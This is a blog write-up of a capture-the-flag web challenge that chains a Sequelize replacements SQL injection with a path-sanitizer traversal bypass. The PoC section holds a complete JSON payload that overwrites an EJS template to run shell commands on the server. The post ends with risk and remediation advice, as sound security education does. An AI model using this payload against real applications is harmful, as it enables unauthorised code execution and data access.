---
layout: post
title: "YesWeHack Dojo #45: Chainfection"
date: 2025-10-29
tags: web
description: Write-up for YesWeHack Dojo #45: Chainfection.
image: /assets/img/2025-10-29-yeswehack-dojo-45/preview.png
---

This is my first time trying out YesWeHack Dojos, and I've got to say I'm impressed.
The platform is very well built and pretty.
Challenges are also well-designed, and I had a lot of fun solving them.
Definitely try them out if you're interested, a new one gets released every month!

The Chainfection dojo can be accessed [here](https://dojo-yeswehack.com/challenge-of-the-month/dojo-45).

## Description

The application allows users to upload attachments for antivirus scanning.
However, due to vulnerable packages being used in the application, it is vulnerable to SQL injection and a path traversal vulnerability.
The SQL injection vulnerability allows an attacker to inject arbitary SQL code into the original query and manipulate its behaviour to return a user that is not verified.
This user object is subsequently used to determine the file in which the user's supplied contents is written to.
Due to a path traversal vulnerability in `path-sanitizer` library, the prior bug can be used with the path traversal to gain arbitrary file writes on the server, ultimately leading to remote code execution.

## Analysis

### Setup code

The setup code shows that a random filename is generated for the flag.
This hints that we need to get remote code execution on the challenge server to retrieve the flag.

```javascript
fs.writeFileSync(`flag_${crypto.randomBytes(16).toString('hex')}.txt`, flag);
```

The setup code loads a sqlite3 database in memory, and initializes the `Users` table in `init()`.
Here, the "brumens" user is created with `verify: true` and an attachment, whereas the "leet" user has `verify: false` and an empty attachment.
This difference will come in useful later on.

```
async function init() {
    await sequelize.sync();
    // insert users
    await Users.create({
      name: "brumens",
      verify: true,
      attachment: "document.txt",
    });
    await Users.create({
      name: "leet",
      verify: false,
      attachment: "",
    });
}
```

### Main code

In `main()`, it first parses our JSON input into `data`, and uses `data.attachment` to update the attachment for the leet user (second user initialized so id = 2).

```javascript
data = getJsonInput(decodeURIComponent(""))

    await Users.update(
      { attachment: data.attachment },
      {
        where: {
          id: 2,
        },
      }
    );
```

From `getJsonInput(rawData)`, we know that the server expects our JSON to contain the keys username, updatedat, attachment, and content.

```
function getJsonInput(rawData) {
...[SNIP]...
  // Required keys
  const requiredKeys = [
    "username",
    "updatedat",
    "attachment",
    "content"
  ];

  // Validate presence of keys
```

Then, the code uses replacements to fetch a user from the database that matches our supplied username, and they must be verified.
This means, only the "brumens" user can be fetched.

```javascript
    // Get user from database

      where: {
        [Op.and]: [
          sequelize.literal(`strftime('%Y-%m-%d', updatedAt) >= :updatedat`),
          { name: data.username },
          { verify: true }
        ],
      },
      replacements: { updatedat: data.updatedat },
    })
```

Next, it sanitizes the fetched user's attachment name using `psanitize()` before writing our supplied file contents to it.
Finally, the filename is rendered in the EJS template.

```javascript
    // Sanitize the attachment file path
    const file = `/tmp/user/files/${psanitize(user.attachment)}`
    // Write the attachment content to the sanitized file path
...[SNIP]...
    fs.writeFileSync(file, data.content)
  // Render the view
  console.log(ejs.render(fs.readFileSync('/tmp/view/index.ejs', "utf-8"), { filename: path.basename(filename), error: error }))
```

So far, the logic of the program is a bit weird because we're updating the attachment name for "leet", but the user that's being fetched and where the file contents are being written to are for the "brumens" user.

Also, when the EJS template is rendered, it doesn't really do anything because the filename that's being passed to the template will always be empty!

We'll see this if we submit a normal payload like the one below.

```
{"username":"brumens","updatedat":"1970-01-01","attachment":"document.txt","content":"helloworld"}
```

![](/assets/img/2025-10-29-yeswehack-dojo-45/normal.png)

## Exploitation

### SQL injection through Sequelize replacements (CVE-2022-25813)

Sequelize prior to version 6.19.1 is vulnerable to SQL injection when certain parameters are inserted using replacements.

```javascript
const {Sequelize, DataTypes, Op, literal} = require_v("sequelize", "6.19.0");
```

Basically, Sequelize first builds the SQL query for the `WHERE` clause before injecting `:replacements`, and due to a parsing flaw may allow an attacker to inject arbitary SQL code.

```
    // Get user from database
      where: {
        [Op.and]: [
          sequelize.literal(`strftime('%Y-%m-%d', updatedAt) >= :updatedat`),
          { name: data.username },
          { verify: true }
        ],
      },
      replacements: { updatedat: data.updatedat },
    })
```

Referring back to our code, `:updatedat` is used for replacement in the call to `strftime`, and if we also pass `:updatedat` to `data.username`, we can insert arbitrary SQL code.
Assuming that we insert the payload `{"username":":updatedat","updatedat":" OR 1=1 ","attachment":"document.txt","content":"helloworld"}`, Sequelize will first generate the query:

```
SELECT * FROM `Users` AS `User` WHERE (strftime('%Y-%m-%d', updatedAt) >= :updatedat AND `User`.`name` = ':updatedat' AND `User`.`verify` = 1) LIMIT 1
```

Then, it inserts the replacements resulting in:

```
SELECT * FROM `Users` AS `User` WHERE (strftime('%Y-%m-%d', updatedAt) >= ' OR 1=1 ' AND `User`.`firstName` = '' OR 1=1 '' AND `User`.`verify` = 1) LIMIT 1
```

As you can see, the replacement injected into `name` will result in our input being closed in `'' ''` and error out.
We'll fix the syntax error later, but for now we know that we can insert our own SQL code into the query.

### Path traversal in path-sanitizer (CVE-2024-56198)

```javascript
const psanitize = require_v("path-sanitizer", "2.0.0");
```

`path-sanitizer` prior to version 3.1.0 is vulnerable to a path traversal vulnerability when `..=%5c` is used.
This means that if we control the user's attachment being fetched, we can abuse it to overwrite file contents on the server.

### Putting the pieces together

To get remote code execution on the server, we'll first abuse the SQL injection vulnerability using sequelize replacements so that the "leet" user is fetched from the database.
Then, because the attachment name we provide is used to update the attachment for "leet", we can get arbitrary file write using the path traversal bypass in `path-sanitizer`.
Because the code eventually renders the EJS template at `/tmp/view/index.ejs`, we can overwrite this template to get RCE.


## PoC

The final payload involves using the SQL injection to fetch the "leet" user and the path traversal vulnerability to overwrite `/tmp/view/index.ejs` to read the flag on the server.

```
{"updatedat":" ) or verify=0 --","username":":updatedat","attachment":"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c/tmp/view/index.ejs","content":"<!DOCTYPE html><html><head><title>Please work</title></head><body><pre><%- global.process.mainModule.constructor._load('child_process').execSync('cat flag*').toString() %></pre></body></html>"}
```

This results in Sequelize generating the following query which closes the bracket for `(strftime` early and commenting out the rest to fetch the "leet" user.

```
SELECT * FROM `Users` AS `User` WHERE (strftime('%Y-%m-%d', updatedAt) >= ' ) or verify=0 --' AND `User`.`name` = '' ) or verify=0 --'' AND `User`.`verify` = 1) LIMIT 1
```

![](/assets/img/2025-10-29-yeswehack-dojo-45/flag.png)

Flag: `FLAG{Bug_C4ins_Br1ng5_Th3_B3st_Imp4ct}`

## Risk

The use of vulnerable packages in the application poses significant risk as they can be exploited by an attacker to ultimately gain remote code execution on the server.

First, the SQL vulnerability in Sequelize replacements allows an attacker to inject arbitrary SQL code into the original query and manipulate its behaviour.
An attacker is then able to gain unauthorised access to read, modify, or delete data from the database.

Next, the path traversal bypass in `path-sanitizer` allows an attacker to perform a path traveral attack to write arbitrary file outside of the intended directory.
This can enable remote code execution by overwriting files on the web server.

## Remediation

It is recommended to update the `sequelize` package to at least version 6.19.1 where the SQL injection vulnerability has been patched and update the `path-sanitizer` package to at least version 3.1.0 where the path traversal bypas has been patched.
If updating `sequelize` is not feasible, a temporary workaround is to not use replacements and where options in Sequelize queries.
